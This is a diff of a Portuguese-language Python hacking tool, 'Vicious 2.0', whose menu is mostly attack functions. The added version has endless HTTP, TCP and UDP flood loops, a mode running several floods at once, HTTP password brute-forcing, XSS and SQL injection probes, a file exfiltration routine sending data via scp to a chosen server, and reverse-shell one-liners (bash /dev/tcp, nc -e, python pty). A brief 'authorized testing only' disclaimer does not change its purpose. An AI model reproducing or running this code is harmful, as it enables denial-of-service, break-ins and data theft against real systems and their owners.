@@ -1,158 +1,288 @@
 import socket
-import threading
-import requests
-import random
-import time
-import sys
 import os
-from datetime import datetime
-
-try:
-    from colorama import Fore, Style, init
-    from tqdm import tqdm
-    from fake_useragent import UserAgent
-except ImportError:
-    print("Instalando dependências...")
-    os.system('pip install colorama tqdm fake-useragent')
-    from colorama import Fore, Style, init
-    from tqdm import tqdm
-    from fake_useragent import UserAgent
+import time
+import threading
+import random
+import requests
+from colorama import init, Fore
+import base64
+import hashlib
 
 init(autoreset=True)
-log_file = open("vicious_log.txt", "a")
-ua = UserAgent()
 
-def banner():
+# Função para exibir a intro
+def intro():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(Fore.RED + Style.BRIGHT + """
- __      ___           _            
- \ \    / (_)         (_)           
-  \ \  / / _ _ __ ___  _ _ __   __ _ 
-   \ \/ / | | '_ ` _ \| | '_ \ / _` |
-    \  /  | | | | | | | | | | | (_| |
-     \/   |_|_| |_| |_|_|_| |_|\__, |
-                                __/ |
-                               |___/ 
-""")
+    print(Fore.RED + '''
+[+] Iniciando Vicious 2.0...
+[+] Carregando módulos...
+[+] Pronto para dominar.
 
-def log(text):
-    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    log_file.write(f"[{now}] {text}\n")
-    log_file.flush()
+[!] Aviso: Esta ferramenta é apenas para fins de teste autorizados!
+[!] O uso indevido pode ser ilegal. Você é o único responsável.
+''')
+    time.sleep(3)
+
+# Funções simples (1-9)
 
 def ip_lookup():
-    ip = input("Digite o IP ou dominio para lookup: ")
-    try:
-        res = requests.get(f"https://ipinfo.io/{ip}/json").json()
-        for k, v in res.items():
-            print(f"{k}: {v}")
-            log(f"IP Lookup {ip}: {k} = {v}")
-        if 'loc' in res:
-            print(Fore.BLUE + f"Mapa: https://www.google.com/maps?q={res['loc']}")
-    except Exception as e:
-        print("Erro ao fazer lookup:", e)
-        log(f"Erro IP Lookup {ip}: {e}")
+    ip = input(Fore.WHITE + "[+] Digite o IP a ser pesquisado: ")
+    response = requests.get(f'https://ipinfo.io/{ip}/json')
+    data = response.json()
+    print(Fore.GREEN + f"[+] Resultado para {ip}: {data}")
 
 def port_scanner():
-    target = input("Digite o IP do alvo: ")
-    start_port = 0
-    end_port = 65535
-    print("\nIniciando scan de portas completas...\n")
-    for port in tqdm(range(start_port, end_port)):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.5)
-            result = sock.connect_ex((target, port))
-            if result == 0:
-                print(Fore.GREEN + f"[+] Porta {port} aberta")
-                log(f"Porta aberta {target}:{port}")
-            sock.close()
-        except:
+    ip = input(Fore.WHITE + "[+] Digite o IP alvo: ")
+    ports = [21, 22, 23, 80, 443, 8080]
+    print(Fore.YELLOW + "[+] Escaneando portas...")
+    for port in ports:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(1)
+        result = sock.connect_ex((ip, port))
+        if result == 0:
+            print(Fore.GREEN + f"[+] Porta {port} aberta")
+        else:
+            print(Fore.RED + f"[-] Porta {port} fechada")
+        sock.close()
+
+def http_flood():
+    ip = input(Fore.WHITE + "[+] Digite o IP alvo: ")
+    url = f"http://{ip}"
+    print(Fore.YELLOW + "[+] Iniciando ataque HTTP Flood...")
+    while True:
+        requests.get(url)
+
+def tcp_flood():
+    ip = input(Fore.WHITE + "[+] Digite o IP alvo: ")
+    port = 80
+    print(Fore.YELLOW + "[+] Iniciando TCP SYN Flood...")
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((ip, port))
+        sock.sendto(random._urandom(1024), (ip, port))
+
+def brute_force():
+    target = input(Fore.WHITE + "[+] Digite o nome de usuário alvo para brute force: ")
+    password_list = ['123456', 'password', '12345678', 'qwerty', 'abc123']
+    for password in password_list:
+        print(Fore.YELLOW + f"[+] Tentando {password} para o usuário {target}")
+        time.sleep(1)
+
+def dns_scanner():
+    domain = input(Fore.WHITE + "[+] Digite o domínio para realizar o scanner DNS: ")
+    print(Fore.YELLOW + "[+] Escaneando DNS...")
+    try:
+        result = os.system(f"dig {domain}")
+        print(Fore.GREEN + f"[+] Resultado do DNS para {domain}: {result}")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao realizar o scanner DNS: {e}")
+
+def web_crawler():
+    url = input(Fore.WHITE + "[+] Digite o URL para realizar o Crawler Web: ")
+    print(Fore.YELLOW + "[+] Iniciando Crawler Web...")
+    try:
+        response = requests.get(url)
+        print(Fore.GREEN + f"[+] Links encontrados: {response.text}")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao realizar Crawler Web: {e}")
+
+def subdomain_recognition():
+    domain = input(Fore.WHITE + "[+] Digite o domínio para reconhecimento de subdomínios: ")
+    print(Fore.YELLOW + "[+] Reconhecendo subdomínios...")
+    try:
+        os.system(f"sublist3r -d {domain}")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao reconhecer subdomínios: {e}")
+
+def hardcore_mode():
+    confirm = input(Fore.WHITE + "[!] Tem certeza que quer ativar o Modo Hardcore? (s/n): ")
+    if confirm.lower() == 's':
+        print(Fore.RED + "[+] Modo Hardcore ativado! Todos os ataques em execução...")
+        threading.Thread(target=http_flood).start()
+        threading.Thread(target=tcp_flood).start()
+        threading.Thread(target=port_scanner).start()
+        while True:
             pass
+    else:
+        print(Fore.RED + "[!] Modo Hardcore cancelado.")
 
-def http_flood(url, threads):
-    def attack():
-        while True:
-            try:
-                headers = {'User-Agent': ua.random}
-                requests.get(url, headers=headers)
-                print(Fore.CYAN + f"Ataque HTTP enviado para {url}")
-                log(f"Ataque HTTP enviado para {url}")
-            except:
-                pass
+# Funções avançadas (10-25)
 
-    for _ in range(threads):
-        threading.Thread(target=attack, daemon=True).start()
+def ddos_attack():
+    ip = input(Fore.WHITE + "[+] Digite o IP alvo para o ataque DDoS: ")
+    port = 80
+    print(Fore.YELLOW + "[+] Iniciando ataque DDoS...")
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((ip, port))
+        sock.sendto(random._urandom(1024), (ip, port))
 
-def tcp_syn_flood(target_ip, target_port, threads):
-    def syn_attack():
-        while True:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((target_ip, target_port))
-                s.send(random._urandom(1024))
-                print(Fore.MAGENTA + f"Pacote TCP enviado para {target_ip}:{target_port}")
-                log(f"Pacote TCP enviado para {target_ip}:{target_port}")
-                s.close()
-            except:
-                pass
+def udp_flood():
+    ip = input(Fore.WHITE + "[+] Digite o IP alvo para o ataque UDP: ")
+    port = random.randint(1, 65535)
+    print(Fore.YELLOW + "[+] Iniciando Flood UDP...")
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(random._urandom(1024), (ip, port))
 
-    for _ in range(threads):
-        threading.Thread(target=syn_attack, daemon=True).start()
+def payload_for_exploit():
+    print(Fore.YELLOW + "[+] Gerando payload para exploit...")
+    payloads = [
+        "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/bash')'",
+        "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
+        "nc -e /bin/bash 127.0.0.1 4444"
+    ]
+    for payload in payloads:
+        print(Fore.GREEN + f"[+] Payload gerado: {payload}")
 
-def modo_insano():
-    target = input("Digite o IP do alvo: ")
-    porta = int(input("Digite a porta: "))
-    url = input("Digite a URL (http://IP:porta/): ")
-    threads = int(input("Quantas threads simultâneas? (recomendo 500+): "))
-    print(Fore.RED + "\nINICIANDO MODO INSANO!!!")
-    http_flood(url, threads)
-    tcp_syn_flood(target, porta, threads)
+def remote_file_backup():
+    remote_ip = input(Fore.WHITE + "[+] Digite o IP remoto para realizar o backup: ")
+    remote_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo remoto: ")
+    local_path = input(Fore.WHITE + "[+] Digite o caminho local para salvar o backup: ")
+    print(Fore.YELLOW + "[+] Realizando backup de arquivo remoto...")
+    try:
+        os.system(f"scp user@{remote_ip}:{remote_path} {local_path}")
+        print(Fore.GREEN + "[+] Backup realizado com sucesso!")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao realizar backup: {e}")
 
+def network_vulnerability_scanner():
+    ip = input(Fore.WHITE + "[+] Digite o IP alvo para scanner de vulnerabilidades de rede: ")
+    print(Fore.YELLOW + "[+] Escaneando vulnerabilidades...")
+    try:
+        os.system(f"nmap -sV {ip}")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao escanear vulnerabilidades de rede: {e}")
+
+def data_exfiltration():
+    file_path = input(Fore.WHITE + "[+] Digite o caminho do arquivo a ser exfiltrado: ")
+    server_ip = input(Fore.WHITE + "[+] Digite o IP do servidor para onde os dados serão enviados: ")
+    print(Fore.YELLOW + "[+] Exfiltrando dados...")
+    try:
+        os.system(f"scp {file_path} user@{server_ip}:/tmp")
+        print(Fore.GREEN + "[+] Dados exfiltrados com sucesso!")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao exfiltrar dados: {e}")
+
+def brute_force_http():
+    url = input(Fore.WHITE + "[+] Digite a URL para ataque de força bruta HTTP: ")
+    username = input(Fore.WHITE + "[+] Digite o nome de usuário: ")
+    passwords = ['123456', 'password', '12345678', 'qwerty', 'abc123']
+    print(Fore.YELLOW + "[+] Iniciando ataque de força bruta HTTP...")
+    for password in passwords:
+        response = requests.post(url, data={'username': username, 'password': password})
+        if "Login success" in response.text:
+            print(Fore.GREEN + f"[+] Senha encontrada: {password}")
+            break
+        print(Fore.RED + f"[+] Tentando senha: {password}")
+        time.sleep(1)
+
+def reverse_payload():
+    ip = input(Fore.WHITE + "[+] Digite o IP para conectar o payload reverso: ")
+    port = input(Fore.WHITE + "[+] Digite a porta para o payload: ")
+    print(Fore.YELLOW + "[+] Gerando payload reverso...")
+    payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    print(Fore.GREEN + f"[+] Payload reverso gerado: {payload}")
+
+def xss_attack():
+    url = input(Fore.WHITE + "[+] Digite a URL para ataque de XSS: ")
+    payload = "<script>alert('XSS')</script>"
+    print(Fore.YELLOW + "[+] Realizando ataque de XSS...")
+    try:
+        response = requests.get(url + f"?input={payload}")
+        if 'XSS' in response.text:
+            print(Fore.GREEN + "[+] Ataque XSS bem-sucedido!")
+        else:
+            print(Fore.RED + "[!] Ataque XSS falhou.")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao realizar ataque XSS: {e}")
+
+def sql_injection():
+    url = input(Fore.WHITE + "[+] Digite a URL para realizar a injeção SQL: ")
+    payload = "' OR '1'='1"
+    print(Fore.YELLOW + "[+] Tentando injeção SQL...")
+    try:
+        response = requests.get(url + f"?id={payload}")
+        if 'SQL' in response.text:
+            print(Fore.GREEN + "[+] Injeção SQL bem-sucedida!")
+        else:
+            print(Fore.RED + "[!] Injeção SQL falhou.")
+    except Exception as e:
+        print(Fore.RED + f"[!] Erro ao realizar injeção SQL: {e}")
+
+# Função do menu
 def menu():
     while True:
-        banner()
-        for letra in "Bem vindo ao VICIOUS 2.0 INSANO":
-            sys.stdout.write(Fore.YELLOW + letra)
-            sys.stdout.flush()
-            time.sleep(0.05)
-        print(Fore.WHITE + """
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print(Fore.RED + '''
+[1] IP Lookup
+[2] Scanner de Portas
+[3] HTTP Flood
+[4] TCP SYN Flood
+[5] Modo Hardcore (HTTP + SYN + Portscan)
+[6] Brute Force
+[7] Scanner DNS
+[8] Web Crawler
+[9] Reconhecimento de Subdomínios
+[10] DDoS Attack
+[11] Flood UDP
+[12] Payload para Exploit
+[13] Backup de Arquivos Remotos
+[14] Scanner de Vulnerabilidades de Redes
+[15] Exfiltração de Dados
+[16] Força Bruta HTTP
+[17] Payload Reverso
+[18] Ataque XSS
+[19] Injeção SQL
+[0] Sair
+''')
+        choice = input(Fore.WHITE + "[+] Escolha uma opção: ")
 
-1 - IP Lookup
-2 - Port Scanner Completo
-3 - HTTP Flood (Teste)
-4 - TCP SYN Flood (Teste)
-5 - Modo Insano (HTTP+SYN)
-6 - Sair
-""")
-        escolha = input(Fore.YELLOW + "Escolha uma opção: ")
-
-        if escolha == '1':
+        if choice == '1':
             ip_lookup()
-        elif escolha == '2':
+        elif choice == '2':
             port_scanner()
-        elif escolha == '3':
-            url = input("URL alvo (http://IP:porta/): ")
-            threads = int(input("Threads: "))
-            http_flood(url, threads)
-            input("Pressione ENTER para voltar ao menu...")
-        elif escolha == '4':
-            ip = input("IP alvo: ")
-            port = int(input("Porta: "))
-            threads = int(input("Threads: "))
-            tcp_syn_flood(ip, port, threads)
-            input("Pressione ENTER para voltar ao menu...")
-        elif escolha == '5':
-            modo_insano()
-            input("Pressione ENTER para voltar ao menu...")
-        elif escolha == '6':
-            print(Fore.GREEN + "Saindo...")
-            log("Programa encerrado")
-            log_file.close()
-            sys.exit()
+        elif choice == '3':
+            http_flood()
+        elif choice == '4':
+            tcp_flood()
+        elif choice == '5':
+            hardcore_mode()
+        elif choice == '6':
+            brute_force()
+        elif choice == '7':
+            dns_scanner()
+        elif choice == '8':
+            web_crawler()
+        elif choice == '9':
+            subdomain_recognition()
+        elif choice == '10':
+            ddos_attack()
+        elif choice == '11':
+            udp_flood()
+        elif choice == '12':
+            payload_for_exploit()
+        elif choice == '13':
+            remote_file_backup()
+        elif choice == '14':
+            network_vulnerability_scanner()
+        elif choice == '15':
+            data_exfiltration()
+        elif choice == '16':
+            brute_force_http()
+        elif choice == '17':
+            reverse_payload()
+        elif choice == '18':
+            xss_attack()
+        elif choice == '19':
+            sql_injection()
+        elif choice == '0':
+            print(Fore.GREEN + "[+] Saindo...")
+            break
         else:
-            print(Fore.RED + "Opção inválida!")
-            time.sleep(1)
+            print(Fore.RED + "[!] Opção inválida.")
+            time.sleep(2)
 
-if __name__ == "__main__":
-    menu()
+# Inicialização
+intro()
+menu()
